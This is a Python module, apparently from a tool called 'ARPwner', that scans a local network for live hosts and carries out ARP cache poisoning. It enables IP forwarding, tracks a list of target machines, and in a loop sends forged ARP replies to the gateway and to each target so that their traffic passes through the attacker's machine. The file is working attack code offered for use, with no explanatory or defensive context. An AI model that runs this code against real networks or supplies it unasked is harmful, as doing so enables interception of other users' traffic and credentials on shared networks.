import socket
import binascii
import time
import sys
import os
import struct
import threading
import random
from Engine.functions import incIp, macFormat, ipFormat

try:
    import Libs.dpkt as dpkt
except ImportError:
    sys.exit("[-] Couldn't import: ./Libs/dpkt")
try:
    import fcntl
except ImportError:
    sys.exit("[-] Couldn't import: fcntl")

class Sock:

    def open_sock(self, iface, timeout = None):
        sock = socket.socket(socket.PF_PACKET, socket.SOCK_RAW)
        sock.bind((iface, dpkt.ethernet.ETH_TYPE_ARP))
        if (timeout != None): sock.settimeout(timeout)
        return sock



class targetObject(object):
    def __init__(self,ip, mac = None, brand = None):
        self.ip = ip
        self.mac = mac
        self.brand = brand

class ARP(threading.Thread):
    def __init__(self,iface):
        threading.Thread.__init__(self)
        self.iface = iface
        self.network = [] #Network list (list where saves the networks client)
        self.targets = [] #target list (list where saves the networks clients to spoof it)
        self.running = False
        self.ping = False # this enable or disable the ping in the isOnline
        self.ffMac = '\xff\xff\xff\xff\xff\xff'
        self.enableForwarding()
        try:
            self.srcMac = self.iface.hwaddr
            self.srcIp = self.iface.ip
            self.gateway = targetObject(self.iface.gateway,self.iface.gwhwaddr)
            self.retdata = True
        except(IOError, OSError):
            self.retdata = False

    def enableForwarding(self):
        if sys.platform == 'darwin':
            os.system('sysctl -w net.inet.ip.forwarding=1')
            os.system('sysctl -w net.inet.ip.fw.enable=1')
        elif sys.platform[:5] == 'linux':
            f = open('/proc/sys/net/ipv4/ip_forward','w')
            f.write('1')
            f.close()

    def isOnline(self,dst=None): #checks if the ip is online or not, using ARP WHO
        arp = dpkt.arp.ARP()
        arp.sha = self.srcMac  #mac of host machine
        arp.spa = socket.inet_aton(self.srcIp)  #ip of host machine
        arp.tha = self.ffMac    #fake Mac Address
        arp.tpa = socket.inet_aton(dst) #ip of target machine to check.
          
        packet = dpkt.ethernet.Ethernet()
        packet.src  = self.srcMac
        packet.dst  = self.ffMac
        packet.data = arp
        packet.type = dpkt.ethernet.ETH_TYPE_ARP
        try:
            sock = Sock().open_sock(self.iface.name, 0.1)
            sock.send(str(packet))
            buf = sock.recv(0xffff)
        except socket.timeout:
            sock.close()
            if (self.ping):
                tmp = self.pingIp(dst)
                if (tmp == False):
                    return False
                else:
                    return tmp
            else:
                return False
        sock.close()
        return targetObject(dst,buf[6:12])

    def pingIp(self, dst=None):
        icmp = str(dpkt.icmp.ICMP(type=8, data=dpkt.icmp.ICMP.Echo(id=random.randint(0, 0xffff), data='ARPwner')))
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, 1)
            sock.connect((dst,1))
            sock.send(icmp)
            sock.settimeout(0.5)
            buf = sock.recv(0xffff)
        except(socket.timeout,socket.error):
            sock.close()
            return False
        ##debug print "Found PC: %s"%(dst)
        return targetObject(dst)

    def buildPoison(self, src=None, dst=None):
        arp = dpkt.arp.ARP()
        arp.sha = self.srcMac
        arp.spa = socket.inet_aton(dst.ip)
        arp.tha = src.mac
        arp.tpa = socket.inet_aton(src.ip)
        arp.op  = dpkt.arp.ARP_OP_REPLY
      
        packet = dpkt.ethernet.Ethernet()
        packet.src  = self.srcMac
        packet.dst  = src.mac
        packet.data = arp
        packet.type = dpkt.ethernet.ETH_TYPE_ARP
        return packet

    def arpPoison(self, src=None, dst=None):
        if (src != None and dst != None):
            sock = Sock().open_sock(self.iface.name)
            sock.send(str(self.buildPoison(src, dst)))
            sock.send(str(self.buildPoison(dst, src)))
            sock.close()

    def scanRange(self,ip1,ip2):
        while(ip1 != ip2):
            request = self.isOnline(ip1)
            if(request != False): self.network += [request]
            ip1 = incIp(ip1)
        return len(self.network)

    def addTarget(self,target):
        try:
            self.targets.append(self.network[target])
            self.network.pop(target)
        except(IndexError):
            pass

    def addipTarget(self,ip):
        try:
            for i in range(0,len(self.network)):
                if self.network[i].ip == ip:
                    self.targets.append(self.network[i])
                    self.network.pop(i)
        except(IndexError):
            pass


    def remipTarget(self,ip):
        try:
            for i in range(0,len(self.targets)):
                if self.targets[i].ip == ip:
                    self.network.append(self.targets[i])
                    self.targets.pop(i)
        except(IndexError):
            pass

    def remTarget(self,target):
        self.targets.pop(target)

    def run(self):
        while(self.running):
            for target in self.targets:
                #print "Poisoning %s  --- > %s"%(self.gateway.ip,target.ip)
                self.arpPoison(self.gateway,target)
                time.sleep(1)

        



#for target in targets:
#    print target['IP']
#while(1):
#    arp.arpPoison('10.0.0.1','10.0.0.204')
